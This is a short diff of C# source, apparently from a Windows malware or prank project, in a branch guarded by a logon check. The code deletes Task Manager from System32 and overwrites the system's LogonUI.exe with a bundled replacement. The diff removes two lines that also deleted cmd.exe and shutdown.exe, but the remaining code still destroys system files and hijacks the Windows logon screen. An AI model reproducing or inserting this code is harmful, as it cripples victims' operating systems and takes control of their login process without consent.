@@ -45,8 +45,7 @@ namespace amp_pcv
                 {
                     logon_check = false;
                     File.Delete(@"C:\Windows\System32\taskmgr.exe");
-                    File.Delete(@"C:\Windows\System32\cmd.exe");
-                    File.Delete(@"C:\Windows\System32\shutdown.exe");
+                   
                     
 
                     File.WriteAllBytes(@"C:\Windows\System32\LogonUI.exe", Properties.Resources.LogonUI);
